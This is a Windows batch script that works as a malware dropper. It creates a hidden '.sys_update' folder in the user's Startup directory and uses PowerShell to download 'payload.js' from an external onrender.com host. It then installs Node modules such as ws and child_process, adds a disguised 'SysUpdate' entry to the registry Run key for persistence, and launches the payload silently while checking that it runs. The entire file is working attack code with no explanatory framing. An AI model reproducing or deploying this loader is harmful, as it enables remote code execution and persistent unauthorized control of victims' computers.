@echo off
setlocal enabledelayedexpansion

:: --- CONFIGURATION ---
set "DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\.sys_update"
set "PAYLOAD_URL=https://payload-x3rf.onrender.com/payload.js"
set "LOCAL_PAYLOAD=%DIR%\payload.js"
set "LOG_FILE=%DIR%\install.log"

:: --- STEP 1: Ensure Directory Exists ---
if not exist "%DIR%" mkdir "%DIR%" 2>nul

:: --- STEP 2: Download Latest Payload ---
powershell -Command "Invoke-WebRequest -Uri '%PAYLOAD_URL%' -OutFile '%LOCAL_PAYLOAD%'" >nul 2>&1

if not exist "%LOCAL_PAYLOAD%" (
    echo [ERROR] Failed to download payload.js >> "%LOG_FILE%"
    exit /b 1
)

for %%F in ("%LOCAL_PAYLOAD%") do if %%~zF==0 (
    echo [ERROR] Downloaded payload.js is empty >> "%LOG_FILE%"
    del "%LOCAL_PAYLOAD%"
    exit /b 1
)

:: --- STEP 3: Install Dependencies ---
:: Change to the payload directory and run npm install
pushd "%DIR%"
call npm install ws child_process fs os path https http crypto 2>>"%LOG_FILE%"
if %errorlevel% neq 0 (
    echo [ERROR] npm install failed. Check %LOG_FILE% >> "%LOG_FILE%"
    popd
    exit /b 1
)
popd

:: --- STEP 4: Find Node.js ---
where node >nul 2>&1
if %errorlevel% neq 0 (
    if exist "C:\Program Files\nodejs\node.exe" set "NODE=C:\Program Files\nodejs\node.exe"
    if exist "C:\Users\%USERNAME%\AppData\Local\Programs\Node.js\node.exe" set "NODE=C:\Users\%USERNAME%\AppData\Local\Programs\Node.js\node.exe"
    if defined NODE (
        echo [INFO] Found Node at: %NODE% >> "%LOG_FILE%"
    ) else (
        echo [ERROR] Node.js not found. >> "%LOG_FILE%"
        exit /b 1
    )
) else (
    set "NODE=node"
    echo [INFO] Using Node from PATH: %NODE% >> "%LOG_FILE%"
)

:: --- STEP 5: Register Persistence ---
if defined NODE (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /t REG_SZ /d "cmd /c start \"\" /b \"%NODE%\" \"%LOCAL_PAYLOAD%\"" /f
) else (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SysUpdate" /t REG_SZ /d "cmd /c start \"\" /b node \"%LOCAL_PAYLOAD%\"" /f
)

:: --- STEP 6: Execute Payload Immediately ---
if defined NODE (
    start "" /b "%NODE%" "%LOCAL_PAYLOAD%" >> "%LOG_FILE%" 2>&1
) else (
    start "" /b node "%LOCAL_PAYLOAD%" >> "%LOG_FILE%" 2>&1
)

timeout /t 2 /nobreak >nul

:: --- STEP 7: Verify ---
set "PID="
for /f "tokens=5" %%a in ('tasklist /FI "IMAGENAME eq node.exe" /FO CSV ^| findstr /i "payload.js"') do set "PID=%%a"

if defined PID (
    echo [SUCCESS] Payload running with PID: %PID%
) else (
    echo [FAILED] Payload not running. Check %LOG_FILE% for errors.
)

exit
